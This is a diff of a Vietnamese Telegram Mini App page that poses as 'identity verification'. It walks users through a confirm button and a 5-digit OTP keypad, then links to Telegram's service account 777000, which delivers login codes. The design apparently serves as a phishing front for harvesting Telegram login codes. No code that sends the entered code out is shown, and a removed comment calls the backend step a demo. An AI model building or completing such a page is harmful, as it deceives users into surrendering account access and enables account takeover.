@@ -1,111 +1,117 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { width: 90%; text-align: center; }
-        .hidden { display: none !important; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MiniApp Telegram</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+.container { width: 90%; text-align: center; }
+.hidden { display: none !important; }
 
-        /* Style Step 1 */
-        .btn-confirm { background: #0088cc; color: white; padding: 15px 40px; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
+.btn-confirm { background: #0088cc; color: white; padding: 15px 40px; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
 
-        /* Style Step 2 (OTP) */
-        .msg-box { background: white; color: #333; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; }
-        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; }
-        .otp-box { width: 45px; height: 60px; border: 2px solid #555; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; background: #333; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #0066ff; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 20px; cursor: pointer; }
-    </style>
+.msg-box { background: white; color: #333; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; }
+.otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; }
+.otp-box { width: 45px; height: 60px; border: 2px solid #555; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; background: #333; }
+.keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+.key { background: #0066ff; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 20px; cursor: pointer; }
+
+.btn-view { background: #00cc66; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
+</style>
 </head>
 <body>
-    <div class="container">
-        <!-- --- MÀN HÌNH BƯỚC 1 --- -->
-        <div id="step-1">
-            <div style="margin-bottom: 30px;">
-                <img src="https://via.placeholder.com/150" style="border-radius: 50%;">
-                <h2>Xác minh danh tính</h2>
-                <p>Nhấn vào nút bên dưới để bắt đầu</p>
-            </div>
-            <button class="btn-confirm" onclick="finishStep1()">XÁC NHẬN</button>
+<div class="container">
+    <!-- Step 1 -->
+    <div id="step-1">
+        <div style="margin-bottom:30px;">
+            <img src="https://via.placeholder.com/150" style="border-radius:50%;">
+            <h2>Xác minh danh tính</h2>
+            <p>Nhấn nút bên dưới để bắt đầu</p>
         </div>
+        <button class="btn-confirm" onclick="finishStep1()">XÁC NHẬN</button>
+    </div>
 
-        <!-- --- MÀN HÌNH BƯỚC 2 (OTP) --- -->
-        <div id="step-2" class="hidden">
-            <div class="msg-box">
-                📩 Chúng tôi đã gửi mã xác nhận cho bạn. Hãy nhập mã bằng bàn phím bên dưới.
-            </div>
-            <div class="otp-inputs">
-                <div class="otp-box"></div>
-                <div class="otp-box"></div>
-                <div class="otp-box"></div>
-                <div class="otp-box"></div>
-                <div class="otp-box"></div>
-            </div>
-            <div class="keypad">
-                <button class="key" onclick="press('1')">1</button>
-                <button class="key" onclick="press('2')">2</button>
-                <button class="key" onclick="press('3')">3</button>
-                <button class="key" onclick="press('4')">4</button>
-                <button class="key" onclick="press('5')">5</button>
-                <button class="key" onclick="press('6')">6</button>
-                <button class="key" onclick="press('7')">7</button>
-                <button class="key" onclick="press('8')">8</button>
-                <button class="key" onclick="press('9')">9</button>
-                <div></div>
-                <button class="key" onclick="press('0')">0</button>
-                <button class="key" onclick="del()">⌫</button>
-            </div>
+    <!-- Step 2 -->
+    <div id="step-2" class="hidden">
+        <div class="msg-box">📩 Chúng tôi đã gửi mã xác nhận. Nhập OTP bằng bàn phím bên dưới.</div>
+        <div class="otp-inputs">
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+        </div>
+        <div class="keypad">
+            <button class="key" onclick="press('1')">1</button>
+            <button class="key" onclick="press('2')">2</button>
+            <button class="key" onclick="press('3')">3</button>
+            <button class="key" onclick="press('4')">4</button>
+            <button class="key" onclick="press('5')">5</button>
+            <button class="key" onclick="press('6')">6</button>
+            <button class="key" onclick="press('7')">7</button>
+            <button class="key" onclick="press('8')">8</button>
+            <button class="key" onclick="press('9')">9</button>
+            <div></div>
+            <button class="key" onclick="press('0')">0</button>
+            <button class="key" onclick="del()">⌫</button>
         </div>
     </div>
 
+    <!-- Step 3 -->
+    <div id="step-3" class="hidden">
+        <div class="msg-box">🎉 Bạn đã xác nhận OTP thành công!</div>
+        <button class="btn-view" onclick="openTelegram()">XEM MÃ</button>
+    </div>
+</div>
+
 <script>
-    const tg = window.Telegram.WebApp;
-    tg.ready();
+const tg = window.Telegram.WebApp;
+tg.ready();
 
-    // Step 1: xác nhận
-    async function finishStep1() {
-        tg.HapticFeedback.impactOccurred('medium');
+// Step 1
+function finishStep1() {
+    tg.HapticFeedback.impactOccurred('medium');
+    document.getElementById('step-1').classList.add('hidden');
+    document.getElementById('step-2').classList.remove('hidden');
+}
 
-        // Demo: giả lập API thành công → hiện step 2
-        document.getElementById('step-1').classList.add('hidden');
-        document.getElementById('step-2').classList.remove('hidden');
-    }
+// Step 2: OTP
+let otp = "";
+const boxes = document.querySelectorAll('.otp-box');
 
-    // Step 2: nhập OTP
-    let otp = "";
-    const boxes = document.querySelectorAll('.otp-box');
-
-    function press(num) {
-        if (otp.length < 5) {
-            otp += num;
-            renderOTP();
-            tg.HapticFeedback.impactOccurred('light');
-            if (otp.length === 5) sendFinalOTP(otp);
-        }
-    }
-
-    function del() {
-        otp = otp.slice(0, -1);
+function press(num) {
+    if (otp.length < 5) {
+        otp += num;
         renderOTP();
+        tg.HapticFeedback.impactOccurred('light');
+        if (otp.length === 5) goStep3();
     }
+}
 
-    function renderOTP() {
-        boxes.forEach((box, i) => {
-            box.innerText = otp[i] || "";
-            box.style.borderColor = i === otp.length ? "#0088cc" : "#555";
-        });
-    }
+function del() {
+    otp = otp.slice(0, -1);
+    renderOTP();
+}
 
-    function sendFinalOTP(code) {
-        // Sau khi nhập OTP xong → chuyển sang Telegram user id 777000
-        const confirmResult = confirm("Mã OTP: " + code + "\nChuyển sang Telegram?");
-        if (confirmResult) {
-            window.location.href = "tg://user?id=777000";
-        }
-    }
+function renderOTP() {
+    boxes.forEach((box, i) => {
+        box.innerText = otp[i] || "";
+        box.style.borderColor = i === otp.length ? "#0088cc" : "#555";
+    });
+}
+
+// Khi đủ 5 số → Step 3
+function goStep3() {
+    document.getElementById('step-2').classList.add('hidden');
+    document.getElementById('step-3').classList.remove('hidden');
+}
+
+// Step 3: mở Telegram
+function openTelegram() {
+    window.location.href = "tg://user?id=777000";
+}
 </script>
 </body>
 </html>
